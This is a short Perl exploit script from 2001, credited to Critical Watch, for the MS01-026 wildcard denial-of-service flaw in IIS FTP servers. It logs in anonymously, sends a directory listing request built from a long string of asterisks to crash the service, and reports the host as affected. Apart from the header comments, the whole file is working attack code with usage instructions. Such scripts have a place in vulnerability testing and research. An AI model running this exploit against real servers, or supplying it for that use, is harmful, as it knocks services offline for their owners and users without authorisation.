#!/usr/bin/perl
# Author:  Nelson Bunker - Critical Watch 
# 	   http://www.criticalwatch.com 
#
# Simple Wildcard Denial of Service for IIS Ftp Servers - MS01-026 
# Tested against several servers.  Your mileage may vary.
#
# Assumes anonymous access.
#
# Thanks goes out to Lukasz Luzar [lluzar@developers.of.pl]
# For discovering and sharing this information
#
# May 15, 2001
####################_MAIN::Begin_#####################


 use Net::FTP; 

        $wildcard='*********************************************************************************************************';

if (not $ARGV[0]) {

print qq~

       Usage: wildcard_dos.pl <host>

~;

        exit;}


        $IPaddress= $ARGV[0];


        $SIG {'PIPE'} = FoundIt;

        # create new FTP connection w/30 second timeout
        $ftp = Net::FTP->new($IPaddress, Timeout =>  5);

        if(!$ftp){ die"$IPaddress is not responding to ftp connect attempt";}

        if(!$ftp->login("anonymous","tester\@")){ die"FTP user anonymous on $IPaddress is unacceptable";}

        $bogus = $ftp->ls($wildcard);


sub FoundIt
        {
        print "This machine \($IPaddress\) is affected\n";
	exit(0);

        }

